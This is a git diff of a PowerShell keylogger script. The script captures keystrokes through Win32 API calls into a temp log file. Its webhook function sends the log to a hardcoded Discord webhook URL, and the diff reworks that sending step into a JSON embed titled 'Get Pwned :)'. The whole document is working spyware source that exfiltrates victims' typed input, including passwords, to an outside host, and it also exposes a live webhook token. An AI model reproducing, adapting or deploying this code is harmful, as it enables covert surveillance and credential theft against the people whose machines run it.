@@ -4,13 +4,46 @@
  
  $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
 
- function Webhook($webhookUri = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'){
-     
-    $Body = @{
-  
-        'content' = get-content $env:temp/keylogger.log
-        }
-      Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+ function Webhook($webhook = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'){
+
+#Create embed array
+    [System.Collections.ArrayList]$embedArray = @()
+    
+    #Store embed values
+    $title       = 'Get Pwned :)'
+    $description = [IO.File]::ReadAllText("$env:tmp\keylogger.log")
+     $color       = '1'
+    
+    #Create thumbnail object
+    $thumbUrl = 'https://thumbs.gfycat.com/ApprehensiveOddballAgama-max-1mb.gif'
+    $thumbnailObject = @{
+    
+        url = $thumbUrl
+    
+    }
+    
+    #Create embed object, also adding thumbnail
+    $embedObject = [PSCustomObject]@{
+    
+        title    = $title
+        description = $description
+        color      = $color
+        thumbnail   = $thumbnailObject
+    
+    }
+    
+    #Add embed object to array
+    $embedArray.Add($embedObject)
+    
+    #Create the payload
+    $payload = [PSCustomObject]@{
+    
+       embeds = $embedArray
+    
+    }
+    
+    #Send over payload, converting it to JSON
+    Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose
 
       $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
      }
@@ -33,9 +66,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-
-
-   # generate log file
  
   
 
@@ -50,6 +80,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         # is key pressed?
         if ($state -eq -32767) {
           $generateLog = [console]::CapsLock
+          
+          
 
           # translate scan code to real code
           $virtualKey = $API::MapVirtualKey($ascii, 3)
@@ -91,7 +123,5 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
          $time = $time2
       }
 
-    
-     
-     }
+    }
 
